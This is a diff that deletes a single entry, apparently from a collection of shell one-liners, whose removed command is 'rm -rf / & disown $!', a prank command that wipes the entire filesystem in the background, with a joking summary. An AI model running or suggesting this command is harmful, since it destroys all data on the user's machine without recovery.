@@ -1,8 +1,0 @@
-commandlinefu_id: 13155
-translator:
-  weibo: ''
-hide: true
-command: |-
-  rm -rf / & disown $!
-summary: |-
-  just because I want to take out the dot
